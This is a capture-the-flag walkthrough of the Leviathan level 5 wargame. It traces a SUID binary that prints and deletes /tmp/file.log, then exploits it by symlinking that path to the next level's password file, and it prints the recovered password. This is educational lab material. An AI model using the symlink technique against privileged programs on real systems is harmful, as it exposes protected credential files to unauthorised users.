# Leviathan Level 5

You can watch the walkthrough for this level here:  
[![YouTube](https://img.shields.io/badge/YouTube-Walkthrough-red?logo=youtube)](https://www.youtube.com/watch?v=Bbqw-52itfQ&t=1s&ab_channel=Gabahack)

> This video shows my full process solving (in Spanish) Level 5 from scratch, including the obstacles and mistakes I faced along the way. Some walkthroughs might be longer or shorter depending on the complexity of the level or how quickly I find the solution.

---


## 🔍 Exploration

We begin by inspecting the current directory. We find an executable with SUID permissions:

```bash
leviathan5@gibson:~$ ls
leviathan5
leviathan5@gibson:~$ file leviathan5 
leviathan5: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=0fbe5a715bf8cd28d02bc0e989a37f9c0ab21614, for GNU/Linux 3.2.0, not stripped
```
We explore its strings:

```bash
leviathan5@gibson:~$ strings leviathan5 
td4 
/lib/ld-linux.so.2
_IO_stdin_used
fgetc
puts
exit
setuid
putchar
unlink
fopen
feof
__libc_start_main
fclose
getuid
libc.so.6
GLIBC_2.0
GLIBC_2.1
GLIBC_2.34
__gmon_start__
/tmp/file.log
Cannot find /tmp/file.log
;*2$"(
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
crt1.o
__abi_tag
__wrap_main
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
leviathan5.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
__x86.get_pc_thunk.bx
_edata
fclose@GLIBC_2.1
_fini
getuid@GLIBC_2.0
unlink@GLIBC_2.0
__data_start
puts@GLIBC_2.0
__gmon_start__
exit@GLIBC_2.0
__dso_handle
_IO_stdin_used
feof@GLIBC_2.0
fopen@GLIBC_2.1
putchar@GLIBC_2.0
_end
_dl_relocate_static_pie
_fp_hw
fgetc@GLIBC_2.0
__bss_start
setuid@GLIBC_2.0
__TMC_END__
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rel.dyn
.rel.plt
.init
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got
.got.plt
.data
.bss
.comment
```

We can observe that it looks for a specific file:

```bash
/tmp/file.log
Cannot find /tmp/file.log
```

Executing the binary without the file:

```bash
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
```

Let’s test it with the file:

```bash
leviathan5@gibson:~$ echo 'This is a test' > /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
This is a test
leviathan5@gibson:~$ ./leviathan5 
Cannot find /tmp/file.log
```
Once the binary is executed, the file is automatically removed:

Let’s trace the library calls using ltrace to better understand what the binary does in both cases.

❌ Case 1: When /tmp/file.log does not exist

```bash
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x804910d, 1, 0xffffd384, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                      = 0
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

✅ Case 2: When /tmp/file.log exists

```bash
leviathan5@gibson:~$ echo 'This is a test' > /tmp/file.log
leviathan5@gibson:~$ ltrace ./leviathan5 
__libc_start_main(0x804910d, 1, 0xffffd384, 0 <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                      = 0x804d1a0
fgetc(0x804d1a0)                                                                                                 = 'T'
feof(0x804d1a0)                                                                                                  = 0
putchar(84, 0x804a008, 0, 0)                                                                                     = 84
fgetc(0x804d1a0)                                                                                                 = 'h'
feof(0x804d1a0)                                                                                                  = 0
putchar(104, 0x804a008, 0, 0)                                                                                    = 104
fgetc(0x804d1a0)                                                                                                 = 'i'
feof(0x804d1a0)                                                                                                  = 0
putchar(105, 0x804a008, 0, 0)                                                                                    = 105
fgetc(0x804d1a0)                                                                                                 = 's'
feof(0x804d1a0)                                                                                                  = 0
putchar(115, 0x804a008, 0, 0)                                                                                    = 115
fgetc(0x804d1a0)                                                                                                 = ' '
feof(0x804d1a0)                                                                                                  = 0
putchar(32, 0x804a008, 0, 0)                                                                                     = 32
fgetc(0x804d1a0)                                                                                                 = 'i'
feof(0x804d1a0)                                                                                                  = 0
putchar(105, 0x804a008, 0, 0)                                                                                    = 105
fgetc(0x804d1a0)                                                                                                 = 's'
feof(0x804d1a0)                                                                                                  = 0
putchar(115, 0x804a008, 0, 0)                                                                                    = 115
fgetc(0x804d1a0)                                                                                                 = ' '
feof(0x804d1a0)                                                                                                  = 0
putchar(32, 0x804a008, 0, 0)                                                                                     = 32
fgetc(0x804d1a0)                                                                                                 = 'a'
feof(0x804d1a0)                                                                                                  = 0
putchar(97, 0x804a008, 0, 0)                                                                                     = 97
fgetc(0x804d1a0)                                                                                                 = ' '
feof(0x804d1a0)                                                                                                  = 0
putchar(32, 0x804a008, 0, 0)                                                                                     = 32
fgetc(0x804d1a0)                                                                                                 = 't'
feof(0x804d1a0)                                                                                                  = 0
putchar(116, 0x804a008, 0, 0)                                                                                    = 116
fgetc(0x804d1a0)                                                                                                 = 'e'
feof(0x804d1a0)                                                                                                  = 0
putchar(101, 0x804a008, 0, 0)                                                                                    = 101
fgetc(0x804d1a0)                                                                                                 = 's'
feof(0x804d1a0)                                                                                                  = 0
putchar(115, 0x804a008, 0, 0)                                                                                    = 115
fgetc(0x804d1a0)                                                                                                 = 't'
feof(0x804d1a0)                                                                                                  = 0
putchar(116, 0x804a008, 0, 0)                                                                                    = 116
fgetc(0x804d1a0)                                                                                                 = '\n'
feof(0x804d1a0)                                                                                                  = 0
putchar(10, 0x804a008, 0, 0This is a test
)                                                                                     = 10
fgetc(0x804d1a0)                                                                                                 = '\377'
feof(0x804d1a0)                                                                                                  = 1
fclose(0x804d1a0)                                                                                                = 0
getuid()                                                                                                         = 12005
setuid(12005)                                                                                                    = 0
unlink("/tmp/file.log")                                                                                          = 0
+++ exited (status 0) +++
leviathan5@gibson:~$
```

The binary uses standard C library functions to open and read the contents of /tmp/file.log, and then it removes the file using unlink().

In this level, the binary does a good job protecting against command injection. It does not use insecure functions like system() or allow user-controlled input to be interpreted as a command.

## 💣 Exploitation

The vulnerability lies not in command injection, but in the fact that the program trusts that /tmp/file.log is a harmless file — and follows symbolic links blindly. This behavior allows us to trick the program into reading protected files using a symlink attack.

So we can exploit this behavior by creating a symbolic link that points to the password file of the next level:

```bash
leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:~$ ./leviathan5 
szo7HDB88w
```

## 🔐 Password for Leviathan 6
szo7HDB88w
